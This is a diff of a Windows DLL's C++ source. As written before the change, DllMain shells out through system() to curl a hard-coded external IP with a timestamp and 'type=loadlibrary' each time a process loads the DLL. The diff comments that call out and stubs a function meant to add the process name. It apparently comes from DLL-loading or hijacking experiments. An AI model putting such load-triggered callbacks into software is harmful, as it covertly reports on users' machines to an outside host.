@@ -5,13 +5,17 @@
 #include <iostream>
 
 void get_url(std::string url);
+std::string GetCurrentProcName();
 BOOL APIENTRY DllMain(HMODULE hModule,
                       DWORD ul_reason_for_call,
-                      LPVOID lpReserved) {
-    switch (ul_reason_for_call) {
+                      LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
     case DLL_PROCESS_ATTACH:
         std::cout << "use dll by DLL_PROCESS_ATTACH" << std::endl;
-        curl(DLL_PROCESS_ATTACH);
+        // curl(DLL_PROCESS_ATTACH);
+        // 获取当前进程名并curl
 
         break;
     case DLL_THREAD_ATTACH:
@@ -22,7 +26,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     return TRUE;
 }
 
-void curl(int type) {
+void curl(int type)
+{
     std::string ip = "curl \"116.62.202.230";
     std::string uri;
     //     std::chrono::system_clock::time_point t = std::chrono::system_clock::now();
@@ -36,7 +41,8 @@ void curl(int type) {
     //     std::chrono::milliseconds ms = std::chrono::duration_cast<std::chrono::milliseconds>(t.time_since_epoch());
     std::time_t t = std::time(0);
     uri = std::to_string(t);
-    switch (type) {
+    switch (type)
+    {
     case DLL_PROCESS_ATTACH:
         uri.append("&type=loadlibrary");
         break;
@@ -49,7 +55,19 @@ void curl(int type) {
     get_url(ip.append("/?t=").append(uri).append("\""));
 }
 
-void get_url(std::string url) {
+void get_url(std::string url)
+{
     std::cout << "url:" << url.c_str() << std::endl;
     system(url.c_str());
+}
+
+void test()
+{
+    std::cout << "curl dll test function" << std::endl;
+}
+
+std::string GetCurrentProcName()
+{
+    DWORD PID = GetCurrentProcessId();
+    return std::string("");
 }
